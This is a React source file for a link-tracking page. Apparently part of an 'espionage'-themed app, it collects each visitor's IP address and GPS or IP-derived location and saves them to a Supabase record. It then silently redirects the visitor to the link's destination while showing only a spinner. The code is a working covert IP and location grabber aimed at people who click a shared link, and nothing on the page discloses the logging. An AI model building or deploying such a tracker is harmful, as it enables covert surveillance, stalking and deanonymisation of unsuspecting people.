import React, { useEffect, useState } from 'react';
import { supabase } from '../supabase';

export default function TrackerPage() {
  useEffect(() => {
    async function coletar() {
      const id = window.location.pathname.split('/').pop();
      let acesso = {
        ip: 'Unknown',
        loc: 'Unknown',
        data: new Date().toLocaleString('en-US')
      };
      async function getAcessoData() {
        console.log('Tentando pedir permissão de localização...');
        if (navigator.geolocation) {
          return new Promise(resolve => {
            navigator.geolocation.getCurrentPosition(
              pos => {
                console.log('Permissão concedida:', pos);
                acesso.loc = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`;
                acesso.gps = true;
                fetch('https://ipapi.co/json/')
                  .then(resp => resp.json())
                  .then(data => {
                    acesso.ip = data.ip;
                    resolve();
                  })
                  .catch(() => resolve());
              },
              err => {
                console.log('Permissão negada ou erro:', err);
                fetch('https://ipapi.co/json/')
                  .then(resp => resp.json())
                  .then(data => {
                    acesso.ip = data.ip;
                    acesso.loc = data.city + ', ' + data.region + ' - ' + data.country_name;
                    acesso.gps = false;
                    resolve();
                  })
                  .catch(() => resolve());
              },
              { timeout: 5000 }
            );
          });
        } else {
          console.log('Geolocalização não suportada');
          return fetch('https://ipapi.co/json/')
            .then(resp => resp.json())
            .then(data => {
              acesso.ip = data.ip;
              acesso.loc = data.city + ', ' + data.region + ' - ' + data.country_name;
              acesso.gps = false;
            })
            .catch(() => {});
        }
      }
      await getAcessoData();
      console.log('Acesso coletado:', acesso);
      // Busca o link pelo id
      const { data, error } = await supabase
        .from('links')
        .select('*')
        .eq('id', id)
        .single();
      console.log('Resultado da busca do link:', { data, error });
      if (data) {
        // Atualiza acessos
        const novosAcessos = [...(data.acessos || []), acesso];
        const { error: updateError } = await supabase
          .from('links')
          .update({ acessos: novosAcessos })
          .eq('id', id);
        if (updateError) {
          console.error('Erro ao atualizar acessos:', updateError);
        }
        setTimeout(() => {
          if (data.destino) window.location.href = data.destino;
        }, 1500);
      } else {
        console.error('Link não encontrado no Supabase para o id:', id);
      }
    }
    coletar();
  }, []);

  return (
    <div style={{
      minHeight: '100vh',
      background: 'var(--preto-espionagem)',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      textAlign: 'center'
    }}>
      <div style={{
        width: 60,
        height: 60,
        border: '6px solid #222',
        borderTop: '6px solid #E60033',
        borderRadius: '50%',
        animation: 'spin 1s linear infinite'
      }} />
      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}